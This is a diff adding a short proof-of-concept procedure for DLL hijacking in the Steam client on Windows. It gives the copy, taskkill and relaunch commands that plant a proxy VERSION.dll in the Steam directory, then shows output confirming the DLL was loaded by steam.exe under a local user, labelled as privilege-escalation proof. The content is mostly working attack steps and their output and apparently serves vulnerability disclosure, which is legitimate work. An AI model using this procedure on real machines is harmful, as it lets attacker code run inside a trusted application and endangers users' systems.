@@ -1,0 +1,18 @@
+Step 1: Copy VERSION.dll to the Steam directory
+> copy VERSION.dll "C:\Program Files (x86)\Steam\VERSION.dll"
+
+Step 2: Kill steam.exe (user process)
+> taskkill /f /im steam.exe
+
+Step 3: Relaunch Steam
+> "C:\Program Files (x86)\Steam\steam.exe"
+
+Step 4: Verify execution
+> type C:\Users\Public\steam_lpe_proof.txt
+
+=== Steam DLL Hijack Proof ===
+Running as: hunter
+Process: C:\Program Files (x86)\Steam\steam.exe
+PID: 121036
+DLL: VERSION.dll (proxy)
+Loaded by steam.exe!
